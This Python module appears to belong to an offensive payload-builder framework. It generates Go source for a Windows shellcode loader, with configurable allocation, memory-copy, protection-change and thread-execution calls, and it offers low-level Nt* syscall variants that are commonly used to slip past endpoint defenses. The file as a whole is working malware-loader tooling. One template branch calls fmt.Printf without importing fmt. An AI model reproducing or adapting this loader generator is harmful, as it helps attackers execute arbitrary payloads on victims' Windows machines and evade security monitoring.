from string import Template
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='copy', default='RtlCopyMemory', help='Function used for copying memory', choices={'RtlCopyMemory', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)        


    def imports(self) -> list[str]:
        return ['unsafe',
                'golang.org/x/sys/windows']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = """
    {transformers}
"""

        if self.args['allocate'] == 'VirtualAlloc':
            template += """
	addr, _, _ := {VirtualAlloc}(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    var addr uintptr = 0
    var regionSize uintptr = {shellcodeSize}
    _, _, _ = {NtAllocateVirtualMemory}(^uintptr(0), uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&regionSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
"""
        elif self.args['allocate'] == 'VirtualAllocEx':
            template += """
	addr, _, _ := {VirtualAllocEx}(^uintptr(0), uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
"""

        if self.args['copy'] == 'RtlCopyMemory':
            template += """
	{RtlCopyMemory}(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
"""
        elif self.args['copy'] == 'NtWriteVirtualMemory':
            template += """
    var numBytes uintptr = {shellcodeSize}
    var numWritten uintptr = 0
	_, _, _ = {NtWriteVirtualMemory}(^uintptr(0), addr, uintptr(unsafe.Pointer(&shellcode[0])), numBytes, uintptr(unsafe.Pointer(&numWritten)))
    fmt.Printf("%d", numWritten)
"""

        if self.args['protect'] == 'VirtualProtect':
            template += Template("""
    oldProtect := 0
	_, _, _ = {VirtualProtect}(addr, uintptr(len(shellcode)), windows.$perm, uintptr(unsafe.Pointer(&oldProtect)))
""").substitute(perm=self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
    oldProtect := 0
    var regSize uintptr = {shellcodeSize}
	_, _, _ = {NtProtectVirtualMemory}(^uintptr(0), uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regSize)), windows.$perm, uintptr(unsafe.Pointer(&oldProtect)))
""" ).substitute(perm=self.args['perm'])


        if self.args['execute'] == 'CreateThread':
            template += """
    hThread, _, _ := {CreateThread}(0, 0, addr, uintptr(0), 0, 0)
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
    var hThread uintptr = 0
    _, _, _ = {NtCreateThreadEx}(uintptr(unsafe.Pointer(&hThread)), 0x001FFFFF, uintptr(0), ^uintptr(0), addr, uintptr(0), 0, 0, 0, 0, uintptr(0));
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
	{WaitForSingleObject}(hThread, 0xFFFFFFFF)
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
	{NtWaitForSingleObject}(hThread, uintptr(0), uintptr(0))
"""

        return template